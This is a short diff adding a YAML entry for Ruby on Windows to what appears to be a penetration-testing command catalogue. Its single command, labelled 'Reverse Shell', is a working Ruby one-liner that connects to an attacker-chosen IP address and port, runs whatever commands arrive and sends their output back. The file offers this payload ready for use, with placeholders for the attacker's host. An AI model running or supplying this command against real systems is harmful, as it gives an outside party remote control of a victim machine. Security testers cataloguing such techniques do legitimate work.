@@ -1,0 +1,15 @@
+---
+name: ruby
+description: Interpreted object-oriented scripting language
+os: Windows
+ptf_module: null
+---
+commands:
+  - "Reverse Shell":
+    - type: ["other","NX"]
+    - text: "ruby -rsocket -e 'c=TCPSocket.new(\"{IPV4}\",\"{INT}\"); while(cmd=c.gets); IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
